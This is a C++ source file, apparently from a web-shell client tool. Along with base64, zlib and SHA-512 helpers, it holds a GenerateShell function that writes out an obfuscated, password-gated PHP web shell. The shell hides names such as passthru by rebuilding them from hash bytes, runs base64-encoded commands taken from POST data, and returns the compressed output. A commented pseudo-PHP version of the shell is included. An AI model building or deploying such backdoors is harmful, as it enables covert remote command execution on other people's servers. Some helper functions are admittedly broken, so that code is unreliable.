#include "strings.h"

Strings::Strings()
{
}

Strings::~Strings()
{
}

char *Strings::WideCharToEncodedBase64String(TCHAR *src)
{
    size_t characters_converted;

    size_t src_len = _tcslen(src);
    size_t buflen = src_len * 2;
    char *out = new char[buflen], *buffer = 0;

    // Conversion
    size_t ret = 0, string_length = 0;
    while ((ret = wcstombs_s(&characters_converted, out,  buflen * sizeof(char), src, src_len * sizeof(TCHAR))) == ERANGE)
        string_length += AppendString(&buffer, out);

    if (string_length != characters_converted)
        string_length += AppendString(&buffer, out);

    size_t stringlen = strlen(buffer);
    std::string str64 = base64_encode(reinterpret_cast<unsigned char*>(buffer), stringlen);
    delete[] out;

    const char *out64 = str64.c_str();
    stringlen = strlen(out64) + 1;
    char *base64 = new char[stringlen];
    memset(base64, 0, stringlen * sizeof(char));
    memcpy(base64, out64, stringlen * sizeof(char));

    return base64;
}

char *Strings::Base64StringToDecodedChar(TCHAR *base64, size_t *out_bytes)
{
    size_t bytes;
    wcstombs_s(&bytes, (char*)NULL, 0, base64, 0);
    char *buffer = new char[bytes + 1];
    memset(buffer, 0, (bytes + 1) * sizeof(char));
    wcstombs_s(&bytes, buffer, bytes, base64, bytes);

    std::string strdecoded = base64_decode(std::string(buffer));
    delete[] buffer;

    const char *outdecoded = strdecoded.c_str();
    *out_bytes = bytes = strdecoded.size();
    char *decoded = new char[bytes];
    memset(decoded, 0, bytes * sizeof(char));
    memcpy(decoded, outdecoded, bytes * sizeof(char));

    return decoded;
}

TCHAR *Strings::Base64StringToDecodedWideChar(TCHAR *base64)
{
    return 0;
}

unsigned char *Strings::Inflate(unsigned char *deflated_data, size_t data_size_bytes, size_t *out_bytes)
{
    size_t buflen = 0;
    unsigned char *buffer = 0;

    z_stream strm;
    unsigned int have = 0;
    
    /* allocate inflate state */
    strm.zalloc = Z_NULL;
    strm.zfree = Z_NULL;
    strm.opaque = Z_NULL;
    strm.avail_in = data_size_bytes;
    strm.next_in = deflated_data;
    int ret = inflateInit2(&strm, -15);
    if (ret != Z_OK)
        return 0;
    
    size_t buffer_chunk_length = 16384;
    unsigned char buffer_chunk[16384];
    do
    {
        memset(buffer_chunk, 0, sizeof(buffer_chunk));
        strm.avail_out = buffer_chunk_length;
        strm.next_out = buffer_chunk;
        ret = inflate(&strm, Z_NO_FLUSH);
        switch (ret) {
            case Z_NEED_DICT:
                ret = Z_DATA_ERROR;     /* and fall through */
            case Z_DATA_ERROR:
            case Z_MEM_ERROR:
                (void)inflateEnd(&strm);
                return 0;
        }
        have = buffer_chunk_length - strm.avail_out;
        buflen = AppendData((char**)&buffer, buflen, (char*)buffer_chunk, have);
    } while (strm.avail_out == 0);

    (void)inflateEnd(&strm);
    *out_bytes = buflen;
    return buffer;
}

unsigned char *Strings::Compress(unsigned char *data, size_t data_size_bytes, size_t *out_bytes)
{
    unsigned long buflen = data_size_bytes * 2;
    unsigned char *buffer = new unsigned char[buflen];
    memset(buffer, 0, buflen * sizeof(char));

    int ret = compress(buffer, &buflen, data, data_size_bytes);
    while (ret == Z_BUF_ERROR)
    {
        delete[] buffer;
        buflen += data_size_bytes;
        buffer = new unsigned char[buflen];
        memset(buffer, 0, buflen * sizeof(char));
        ret = compress(buffer, &buflen, data, data_size_bytes);
    }
    *out_bytes = buflen;
    return buffer;
}

size_t Strings::AppendString(IN char **string1, IN char *string2)
{
    char *string_1 = *string1;

    // Get both string lengths
    size_t string1_length = (string_1 ? strlen(string_1) : 0);
    size_t string2_length = (string2 ? strlen(string2) : 0);

    // Calculate new string length
    size_t new_string_length = string1_length + string2_length + 1;
    char *tmp = new char[new_string_length];
    memset(tmp, 0, new_string_length * sizeof(char));

    // Copy the first string to the start of tmp, if it's not null
    if (string_1)
    {
        memcpy(tmp, string_1, string1_length * sizeof(char));
        delete[] string_1;
    }

    // Copy the second string after the firs string
    if (string2)
        memcpy(tmp + (string1_length * sizeof(char)), string2, string2_length * sizeof(char));

    if (string_1 || string2)
        *string1 = tmp;

    return new_string_length - 1;
}

size_t Strings::AppendData(IN char **buffer, IN size_t buffer_size_bytes, char *data, size_t data_size_bytes)
{
    char *buffer_in = *buffer;

    // New buffer size
    size_t new_buffer_size = buffer_size_bytes + data_size_bytes;
    char *new_buffer = new char[new_buffer_size];
    memset(new_buffer, 0, new_buffer_size * sizeof(char));

    // Copy buffer
    if (buffer_in)
    {
        memcpy(new_buffer, buffer_in, buffer_size_bytes);
        delete[] buffer_in;
    }

    // Copy data
    if (data)
        memcpy(new_buffer + buffer_size_bytes, data, data_size_bytes);

    if (buffer_in || data)
        *buffer = new_buffer;

    return new_buffer_size;
}

TCHAR *Strings::GenerateShell(char *key, char *value, char *command_key)
{
    /*
    SHELLCODE:
    <?php
    @error_reporting(0);
    $unpack = @str_rot13("onfr_pbaireg");
    $hash512_val = 1722079478; // 'sha512'
    $sha512 = @$base_convert($hash512_val, 36, 10); // 044 = 36 in octal, 012 = 10 in octal
    $hash_val = 807137; // 'hash'
    $hash = @$base_convert($hash_val, 36, 10);

    $post = $_POST;
    $password_key = @$base_convert($key, 36, 10);
    $password_value = @$post[$password_key];
    $r = @$hash($sha512, $password_value, 1);
    $functions_array = Array($command, "passthru", "base64_decode", "gzdeflate", "ob_start", 
        "ob_get_contents", "ob_end_clean", "setlocale", "LC_CTYPE", "trim", "strstr", ".", "printf", "chr");
    while (!$all_functions_created)
    {
        $r = $hash($sha512, $r, 1);
        foreach ($byte in $r)
        {
            foreach ($function_name in $functions_array)
            {
                $function_string = ' ';
                foreach ($char in $function_name)
                {
                    if ($char == $byte)
                        $function_string[$byte_index] = $char;
                }
            }
        }
    }
    $base64_encode = $base64_decode;
    // Replace $base64_encode to $base64_decode in a new function
    $base64_encode['d'] = $base64_encode['e'];
    $base64_encode['e'] = $base64_encode['n'];
    @$ob_start();
    @$passthru(@$base64_decode(@$post[$key]));
    $data = @$ob_get_contents();
    @$ob_end_clean();
    $dot = ".";
    @$setlocale(LC_CTYPE, "");
    $codepage = @$trim(@$strstr(@$setlocale(LC_CTYPE, 0), $dot), $dot);
    $chr1 = @$chr(1);
    @$printf($chr1.$codepage.$dot.@$base64_encode(@$gzdeflate($data, 9)).$chr1);
    $data = 0;
    ?>
    */
    size_t len = 4096, index = 0;
    TCHAR *big_buffer = new TCHAR[len];
    memset(big_buffer, 0, len * sizeof(TCHAR));

    size_t commandkey_len = strlen(command_key);
    char *command_key_copy = GetDynamicString(command_key);

    // The password is the first value, this will make the shell code only work with the proper password
    unsigned char sha_hash_1[SHA512_DIGEST_SIZE] = { 0 };
    unsigned char sha_hash_2[SHA512_DIGEST_SIZE] = { 0 };
    GetSHA512(reinterpret_cast<unsigned char*>(value), strlen(value) * sizeof(char), sha_hash_1);

    // Hashing info
    // $b = hash function; 'hash()'
    // $c = hash method name; 'sha512'
    // $d = hash variable; '$hash_value = hash(sha512,$_POST[key], 1);'
    // and the first hash
    HASHING_INFO hashing_info = { _T("b"), _T("c"), _T("d"), sha_hash_1 };

    // Init shell:
    // $a = base_convert()
    // $b = hash()
    // $c = 'sha512'
    // $f = $_POST
    // $g = the $_POST parameter (the key from the key/value pair of the password)
    // $h = password value from the $_POST parameter
    index = _stprintf_s(big_buffer, len, _T("<?php "));
    index += _stprintf_s(big_buffer + index, len - index, _T("@error_reporting(0);"));
    index += _stprintf_s(big_buffer + index, len - index, _T("$a=@str_rot13(\"onfr_pbaireg\");"));
    index += _stprintf_s(big_buffer + index, len - index, _T("$%s=@$a(807137,012,044);"), hashing_info.function_name);
    index += _stprintf_s(big_buffer + index, len - index, _T("$%s=@$a(1722079478,012,044);"), hashing_info.hash_type);
    
    index += _stprintf_s(big_buffer + index, len - index, _T("$f=$_POST;"));
    TCHAR *base_key = BaseEncode(key, strlen(key), 10);
    index += _stprintf_s(big_buffer + index, len - index, _T("$g=@$a(%s,012,044);"), base_key);
    delete[] base_key;
    index += _stprintf_s(big_buffer + index, len - index, _T("$h=@$f[$g];"));

    // $hash_value = hash('sha512', $_POST['key'], 1);
    index += _stprintf_s(big_buffer + index, len - index, _T("$%s=@$%s($%s,$h,1);"), hashing_info.hash_variable, hashing_info.function_name, hashing_info.hash_type);

    // $i = key in $_POST - $f[$i]; (command to execute)
    // $j = exec function (passthru)
    // $k = base64_decode
    // $l = gzdeflate
    // $m = (ob_)start()
    // $n = (ob_)get_contents()
    // $o = (ob_)end_clean()
    // $r = setlocale()
    // $t = trim()
    // $u = strstr()
    // $v = "."
    // $x = printf()
    // $y = chr()
    FUNCTION_INFO functions[] = {
            { "i", command_key },
            { "j", "passthru" },
            { "k", "base64_decode" },
            { "l", "gzdeflate" },
            { "m", "ob_start" },
            { "n", "ob_get_contents" },
            { "o", "ob_end_clean" },
            { "r", "setlocale" },
            { "t", "trim" },
            { "u", "strstr" },
            { "v", "." },
            { "x", "printf" },
            { "y", "chr" }
    };
    index += GenerateVariables(big_buffer + index, len - index, &hashing_info, functions, (sizeof(functions) / sizeof(FUNCTION_INFO)));

    // $a = base_convert()
    // $b = hash function; 'hash()'
    // $c = hash method name; 'sha512'
    // $hash_value = hash variable; '$hash_value = hash(sha512, $_POST[key], 1);'
    // $f = $_POST
    // $g = the $_POST parameter (the key from the key/value pair of the password)
    // $h = password value from the $_POST parameter ($h = $_POST[$g])
    // $i = the $_POST parameter (command to execute) ($f[$i])
    // $j = exec function (passthru)
    // $k = base64_decode
    // $l = gzdeflate
    // $m = (ob_)start()
    // $n = (ob_)get_contents()
    // $o = (ob_)end_clean()
    // $p = "base64_encode"
    // $q = chr(1)
    // $r = setlocale()
    // $t = trim()
    // $u = strstr()
    // $v = "."
    // $x = printf()
    // $y = chr()
    index += _stprintf_s(big_buffer + index, len - index, _T("$p=$k;$p[7]='e';$p[8]='n';$q=@$y(1);@$r(2,\"\");"));
    index += _stprintf_s(big_buffer + index, len - index, _T("@$m();@$j(@$k(@$f[$i]));$z=@$n();@$o();@$x($q.@$t(@$u(@$r(2,0),$v),$v).$v.@$p(@$l($z,%d)).$q.($z=0x00));"), ZLIB_DATA_COMPRESSION_LEVEL);
    index += _stprintf_s(big_buffer + index, len - index, _T(" ?>"));
    
    return big_buffer;
}

int Strings::GenerateVariables(TCHAR *buffer, size_t buflen, HASHING_INFO *hashing_info, FUNCTION_INFO *functions, size_t functions_length)
{
    int *remaining_chars = new int[functions_length];
    int *function_lengths = new int[functions_length];
    char *funcs_buffer[256] = { 0 };
    size_t index = 0, total_chars = 0;
    for (size_t i = 0; i < functions_length; i++)
    {
        index += _stprintf_s(buffer + index, buflen - index, _T("$%hs="), functions[i].variable);
        function_lengths[i] = remaining_chars[i] = strlen(functions[i].function);
        funcs_buffer[i] = GetDynamicString(functions[i].function);
        total_chars += remaining_chars[i];
    }
    index += _stprintf_s(buffer + index, buflen - index, _T("' ';"));

    unsigned char sha_hash_1[SHA512_DIGEST_SIZE] = { 0 };
    unsigned char sha_hash_2[SHA512_DIGEST_SIZE] = { 0 };
    memcpy(sha_hash_1, hashing_info->init_hash, SHA512_DIGEST_SIZE);
    while (total_chars)
    {
        index += _stprintf_s(buffer + index, buflen - index, _T("$%s=$%s($%s,$%s,1);"), 
            hashing_info->hash_variable, hashing_info->function_name, hashing_info->hash_type, hashing_info->hash_variable);

        GetSHA512(sha_hash_1, SHA512_DIGEST_SIZE, sha_hash_2);
        for (int i = 0; i < 20; i++)
        {
            for (size_t y = 0; y < functions_length; y++)
            {
                if (remaining_chars[y])
                {
                    char *function = funcs_buffer[y];
                    for (int z = 0; z < function_lengths[y]; z++)
                    {
                        if ((function[z] != '\0') && (sha_hash_2[i] == function[z]))
                        {
                            index += _stprintf_s(buffer + index, buflen - index, _T("$%hs[%d]=$%s[%d];"), functions[y].variable, z, hashing_info->hash_variable, i);
                            function[z] = '\0';
                            remaining_chars[y]--;
                            total_chars--;
                            break;
                        }
                    }
                }
            }
        }
        memcpy(sha_hash_1, sha_hash_2, SHA512_DIGEST_SIZE);
        memset(sha_hash_2, 0, SHA512_DIGEST_SIZE);
    }

    for (size_t i = 0; i < functions_length; i++)
        delete[] funcs_buffer[i];

    delete[] function_lengths;
    delete[] remaining_chars;
    return index;
}

void Strings::GetSHA512(unsigned char *in, size_t in_bytes, unsigned char *out)
{
    sha512_ctx ctx512;
    sha512_init(&ctx512);
    sha512_update(&ctx512, in, in_bytes);
    sha512_final(&ctx512, out);
}

char *Strings::GetSHA512HEX(IN unsigned char *in, IN size_t in_bytes)
{
    unsigned char sha_hash_1[SHA512_DIGEST_SIZE] = { 0 };
    GetSHA512(in, in_bytes, sha_hash_1);

    size_t index = 0, buflen = SHA512_DIGEST_SIZE * 2 + 1;
    char *buffer = new char[buflen];
    memset(buffer, 0, buflen * sizeof(char));
    for (int i = 0; i < SHA512_DIGEST_SIZE; i++)
        index += sprintf_s(buffer + index, buflen - index, "%02x", sha_hash_1[i]);

    return buffer;
}

char *Strings::GetDynamicString(const char *str)
{
    size_t len = strlen(str);
    char *dynamic_string = new char[len + 1];
    memset(dynamic_string, 0, (len + 1) * sizeof(char));
    memcpy(dynamic_string, str, len * sizeof(char));
    return dynamic_string;
}

wchar_t *Strings::ConvertCharStringToWideChar(IN unsigned int codepage, IN char *src, IN size_t src_size_bytes, OUT size_t *out_bytes)
{
    wchar_t *buffer = 0;

    // Convert to UTF8
    int chars_needed = MultiByteToWideChar(codepage, 0, src, src_size_bytes, NULL, 0);

    if (chars_needed > 0)
    {
        buffer = new wchar_t[chars_needed + 1];
        memset(buffer, 0, (chars_needed + 1) * sizeof(wchar_t));
        MultiByteToWideChar(codepage, 0, src, src_size_bytes, buffer, chars_needed);
    }
    *out_bytes = chars_needed * sizeof(wchar_t);
    return buffer;
}

char *Strings::ConvertWideCharStringToChar(IN unsigned int codepage, IN wchar_t *src, IN size_t src_size, OUT size_t *out_bytes)
{
    char *buffer = 0;

    // Convert to UTF8
    int chars_needed = WideCharToMultiByte(codepage, 0, src, src_size, NULL, 0, NULL, 0);

    if (chars_needed > 0)
    {
        buffer = new char[chars_needed + 1];
        memset(buffer, 0, (chars_needed + 1) * sizeof(char));
        WideCharToMultiByte(codepage, 0, src, src_size, buffer, chars_needed, NULL, 0);
    }
    *out_bytes = chars_needed * sizeof(char);
    return buffer;
}

char *Strings::StoreWideCharBytesInCharBytes(IN wchar_t *src, IN size_t src_size_chars, OUT size_t *out_bytes)
{
    size_t buflen = src_size_chars * 2;
    char *buffer = new char[buflen];
    memset(buffer, 0, buflen * sizeof(char));
    for (size_t i = 0; i < src_size_chars; i++)
    {
        buffer[i * 2] = ((src[i] >> 8) & 0xFF);
        buffer[i * 2 + 1] = (src[i] & 0xFF);
    }
    *out_bytes = buflen;
    return buffer;
}

// This does not work.
wchar_t *Strings::StoreCharBytesInWideCharBytes(IN char *src, IN size_t src_size_chars, OUT size_t *out_bytes)
{
    size_t buflen = (size_t)((double)src_size_chars / 2 + 0.5);
    wchar_t *buffer = new wchar_t[buflen];
    memset(buffer, 0, buflen * sizeof(char));
    for (size_t i = 0, y = 0; i < src_size_chars; i++)
    {
        unsigned int first_byte = ((int)src[i++] & 0xFF) << 8;
        unsigned int second_byte = 0x00;
        if (i + 1 < src_size_chars)
            second_byte = (int)src[i] & 0xFF;

        buffer[y++] = first_byte | second_byte;
    }
    *out_bytes = buflen;
    return buffer;
}

TCHAR *Strings::BaseEncode(char *buffer, size_t buffer_length, int to_base)
{
    char *d = "0123456789abcdefghijklmnopqrstuvwxyz";
    int ret = 0;
    for (char *p = buffer; p && *p; p++) {
        char *r = strchr(d, *p);
        ret = ret * to_base + (r - d);
    }

    int length = 1, val = ret;
    while ((val /= 10) > 0)
        length++;

    length++;   
    TCHAR *value = new TCHAR[length];
    memset(value, 0, length * sizeof(TCHAR));
    _ltot_s(ret, value, length, 10);
    return value;
}
